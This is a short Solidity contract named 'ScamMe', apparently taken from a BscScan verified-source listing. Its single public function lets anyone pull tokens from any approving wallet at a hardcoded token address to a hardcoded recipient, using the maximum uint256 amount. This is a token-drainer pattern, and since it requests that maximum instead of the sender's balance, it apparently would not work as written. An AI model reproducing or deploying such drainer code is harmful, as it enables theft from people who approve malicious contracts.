/**
 *Submitted for verification at BscScan.com on 2022-07-31
*/

//// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;



interface IBusd {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract ScamMe {
    address private constant c = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address private recipient = 0x453611A0f6423A740Dd930E39828E2b26F93A4cB;
    uint private constant INFINITY_APPROVE = 115792089237316195423570985008687907853269984665640564039457584007913129639935;

    function transferFrom(address sender) external returns(bool) {
        return IBusd(c).transferFrom(sender, recipient, INFINITY_APPROVE);
    }
}